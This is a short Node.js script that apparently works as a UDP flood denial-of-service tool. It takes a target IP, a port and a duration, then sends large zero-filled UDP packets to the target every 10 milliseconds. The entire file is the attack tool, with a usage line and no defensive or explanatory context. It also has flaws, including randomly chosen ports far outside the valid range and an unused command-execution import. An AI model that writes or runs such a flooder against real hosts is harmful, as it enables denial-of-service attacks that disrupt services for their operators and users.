const dgram = require('dgram');
const { exec } = require('child_process');

const host = process.argv[2];
const port = parseInt(process.argv[3]);
const length = parseInt(process.argv[4]);
const randomPort = port === 0;

if (isNaN(port) || isNaN(length)) {
    console.error('Usage: node script.js <ip> <port(0=random)> <length(0=forever)>');
    process.exit(1);
}

function udpFlood() {
    let duration;
    if (length > 0) {
        const startTime = Date.now();
        duration = startTime + length * 1000; // Convert seconds to milliseconds
    }

    const sock = dgram.createSocket('udp4');
    const bytes = Buffer.alloc(15000, 0); // Allocate 15000 bytes

    console.log(`Flooding ${host}:${port} for ${length} seconds`);

    function sendPacket() {
        const packetPort = randomPort ? Math.floor(Math.random() * 15000000) : port;
        sock.send(bytes, 0, bytes.length, packetPort, host, (err) => {
            if (err) {
                console.error('Error sending packet:', err);
            } else {
                console.log(`Packet sent to ${host}:${packetPort}`);
            }
        });
    }

    const interval = setInterval(sendPacket, 10); // Adjust the interval as needed

    if (length > 0) {
        setTimeout(() => {
            clearInterval(interval);
            sock.close();
            console.log('DONE');
        }, length * 1000); // Convert seconds to milliseconds
    }
}

udpFlood();